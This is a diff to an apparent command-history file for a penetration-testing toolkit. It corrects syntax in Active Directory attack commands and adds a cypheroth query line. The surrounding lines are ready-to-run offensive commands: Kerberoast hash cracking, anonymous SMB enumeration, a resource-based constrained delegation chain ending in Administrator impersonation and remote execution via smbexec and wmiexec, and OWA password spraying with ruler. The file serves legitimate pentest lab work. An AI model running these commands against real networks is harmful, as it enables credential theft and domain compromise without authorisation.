@@ -114,8 +114,8 @@ john --format=krb5tgs --wordlist=`fzf-wordlists` kerberoastables.txt
 polenum -u anonymous -p anonymous -d BREAKING.BAD
 cme smb 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --pass-pol
 crackmapexec smb 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --pass-pol
-addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass '123soleil!' -dc-host DC01 -domain-netbios BREAKING.BAD 'BREAKING.BAD\anonymous:anonymous'
-rbcd-attack -f SHUTDOWN -t SV01 -dc-ip DC01.BREAKING.BAD 'BREAKING.BAD\anonymous:anonymous'
+addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass '123soleil!' -dc-host DC01 -domain-netbios BREAKING.BAD 'BREAKING.BAD/anonymous:anonymous'
+rbcd-attack -f SHUTDOWN -t SV01 -dc-ip DC01.BREAKING.BAD 'BREAKING\anonymous:anonymous'
 smbexec.py -share 'ADMIN$' -k SV01.BREAKING.BAD
 wmiexec.py -k SV01.BREAKING.BAD
 getST.py -spn CIFS/SV01@BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 'BREAKING.BAD/SHUTDOWN$:123soleil'
@@ -174,7 +174,8 @@ pm3 -p /dev/ttyACM0
 proxmark3 -p /dev/ttyACM0
 theHarvester.py -d example.com -g -s -r -f example.com.xml -b all
 infoga.py -d example.com -s all -b -r example.com.txt -v 2
-nmap --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ -p443 mx.example.com
+nmap --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ -p 443 mx.example.com
 ruler -k -d example.com -u j.doe -p 'Passw0rd!' -e j.doe@example.com --verbose abk dump -o emails.txt
 ruler -k -d example.com brute --users owa-valid-users.txt --passwords passwords.txt --delay 35 --attempts 3 --verbose | tee -a spray-results.txt
 oaburl.py MEGACORP/j.doe:'Passw0rd!'@mx.example.com -e existent.email@example.com
+cypheroth -u neo4j -p exegol4thewin -d BREAKING.BAD
